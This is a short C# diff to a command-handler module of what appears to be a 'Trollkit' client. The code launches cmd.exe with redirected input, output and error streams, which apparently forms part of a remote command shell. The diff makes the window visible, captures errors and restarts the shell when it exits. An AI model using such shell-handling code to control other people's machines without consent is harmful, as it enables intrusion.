@@ -46,20 +46,36 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			{
 				p = new Process();
 				ProcessStartInfo startInfo = new ProcessStartInfo();
-				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				startInfo.WindowStyle = ProcessWindowStyle.Normal;
 				startInfo.FileName = "cmd.exe";
 				startInfo.UseShellExecute = false;
 				startInfo.RedirectStandardOutput = true;
 				startInfo.RedirectStandardInput = true;
+				startInfo.RedirectStandardError = true;
 				p.StartInfo = startInfo;
 				p.Start();
 				p.OutputDataReceived += P_OutputDataReceived;
-				p.BeginOutputReadLine();			
+				p.ErrorDataReceived += P_OutputDataReceived;
+				p.BeginOutputReadLine();
+				p.BeginErrorReadLine();
 			}
 
 			if (p.HasExited)
 			{
+				p = new Process();
+				ProcessStartInfo startInfo = new ProcessStartInfo();
+				startInfo.WindowStyle = ProcessWindowStyle.Normal;
+				startInfo.FileName = "cmd.exe";
+				startInfo.UseShellExecute = false;
+				startInfo.RedirectStandardOutput = true;
+				startInfo.RedirectStandardInput = true;
+				startInfo.RedirectStandardError = true;
+				p.StartInfo = startInfo;
 				p.Start();
+				p.OutputDataReceived += P_OutputDataReceived;
+				p.ErrorDataReceived += P_OutputDataReceived;
+				p.BeginOutputReadLine();
+				p.BeginErrorReadLine();
 			}
 		}
 
@@ -68,6 +84,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			if(p != null)
 			{
 				p.CancelOutputRead();
+				p.CancelErrorRead();
 				p.Kill();
 				p.Close();
 			}
